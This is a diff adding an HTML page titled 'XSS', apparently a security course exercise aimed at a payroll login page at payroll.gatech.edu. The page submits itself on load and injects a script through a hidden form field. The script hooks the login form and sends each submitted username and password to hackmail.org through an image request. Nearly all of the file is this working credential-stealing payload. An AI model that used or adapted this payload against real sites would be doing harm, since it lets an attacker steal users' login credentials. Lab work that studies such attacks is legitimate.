@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+   <head>
+        <meta charset="UTF-8" />
+        <title>XSS</title>
+   </head>
+   <!-- Future refernce: Links that helped understand XSS and methods to implement it -->
+   <!-- https://excess-xss.com/ -->
+   <!-- https://vip.wordpress.com/2015/03/25/preventing-xss-in-javascript/ -->
+   <!--https://stackoverflow.com/questions/37206462/stop-redirect-refresh-on-document-ready-function-->
+   <body onload= "document.sniff.submit()">
+      <form name="sniff" action= "http://payroll.gatech.edu/index.php" method = "POST">
+          <input type = 'hidden' name = 'login' value = '"/>
+          <script>
+                var accountPage = document.forms[0]
+                function accountSniffer() {
+
+                    (new Image()).src="http://hackmail.org/sendmail.php?" + "&username=U3VtbWVyMjAxOFRhcmdldDFFYXN0ZXJFZ2c" + "&payload=" + accountPage.login.value + " "+ accountPage.pw.value + "&random=" + Math.random();
+                    return true;
+                };
+                accountPage.onsubmit = function() {
+                                            return accountSniffer();
+                                        };
+          </script>
+          <input type=hidden name="blahbanator" value=" '/>
+      </form>
+   </body>
